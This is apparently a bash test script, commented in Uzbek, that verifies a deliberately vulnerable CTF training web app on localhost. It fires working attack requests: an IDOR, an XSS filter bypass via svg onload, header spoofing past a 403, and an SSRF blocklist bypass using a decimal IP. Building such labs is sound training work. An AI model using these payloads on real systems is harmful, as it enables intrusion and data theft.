#!/usr/bin/env bash
# Nimbus Reports (standalone Python) — 4 web zaiflikni tekshiradi.
# Ishlatish:  ./start-ctf.sh &   so'ng:  ./test-ctf-py.sh [PORT]
set -u
PORT="${1:-8085}"
T="http://127.0.0.1:${PORT}"
pass=0; fail=0
chk(){ if echo "$2" | grep -q "$1"; then echo "  [PASS] $3"; pass=$((pass+1)); else echo "  [FAIL] $3 -- got: $(echo "$2"|tr '\n' ' '|cut -c1-100)"; fail=$((fail+1)); fi; }

echo "### 0) discovery — endpointlar javob beradi (gobuster -x php,txt topadi)"
OUT=$(for p in download.php search.php fetch.php internal.php flag.php storage-backup/ ; do curl -s -o /dev/null -w '%{http_code} ' $T/$p ; done)
echo "    codes (download/search/fetch/internal/flag/storage-backup): $OUT"
chk "200" "$OUT" "asosiy endpointlar tirik"

echo "### 1) IDOR — download.php (report_id=0 via Burp)"
chk "EJPT{id0r" "$(curl -s -X POST -d 'report_id=0' $T/download.php)" "report_id=0 -> flag"
chk "Monthly Summary" "$(curl -s -X POST -d 'report_id=3' $T/download.php)" "report_id=3 -> oddiy report (bir xil)"

echo "### 2) Information disclosure — ochiq katalog -> base64"
B64=$(curl -s $T/storage-backup/nimbus_db_2024-01-15.sql.txt | grep -oE 'base64\): [A-Za-z0-9+/=]+' | awk '{print $2}')
chk "EJPT{3nc0d3d" "$(echo "$B64" | base64 -d 2>/dev/null)" "storage-backup base64 dekod -> flag"

echo "### 3) Reflected XSS (jim filtr) + flag.php guard"
if curl -s "$T/search.php?q=%3Cscript%3Ealert(1)%3C/script%3E" | grep -q '<script>alert'; then
  echo "  [FAIL] naive <script> jim filtrlanmadi"; fail=$((fail+1)); else echo "  [PASS] naive <script> jim filtrlanadi"; pass=$((pass+1)); fi
chk "<svg onload=alert(1)>" "$(curl -s "$T/search.php?q=%3Csvg%20onload%3Dalert(1)%3E")" "<svg onload> -> reflected (bypass)"
chk "403" "$(curl -s -o /dev/null -w '%{http_code}' $T/flag.php)" "flag.php to'g'ridan -> 403"
chk "EJPT{w4f_byp4ss" "$(curl -s -H 'Sec-Fetch-Site: same-origin' $T/flag.php)" "flag.php same-origin -> XSS flag"
chk "EJPT{w4f_byp4ss" "$(curl -s -H "Referer: $T/search.php" $T/flag.php)" "flag.php same-host Referer -> XSS flag"

echo "### 4) SSRF + decimal-IP bypass — fetch.php"
chk "reach that link" "$(curl -s "$T/fetch.php?url=http://127.0.0.1/internal.php")" "127.0.0.1 -> generic error (blocklist)"
chk "EJPT{ssrf_d3c1m4l" "$(curl -s "$T/fetch.php?url=http://2130706433/internal.php")" "decimal 2130706433 -> internal flag"
# Eslatma: internal.php ga TO'G'RIDAN kirish faqat UZOQ (tarmoq) mijoz uchun 403 beradi;
# xuddi shu xostdan localhost bilan kirilsa loopback bo'lgani uchun flag chiqadi (bu normal).

echo ""
echo "### NATIJA: PASS=$pass  FAIL=$fail"
[ "$fail" -eq 0 ] && echo "✅ Hammasi joyida." || echo "⚠️  Ba'zi testlar yiqildi."
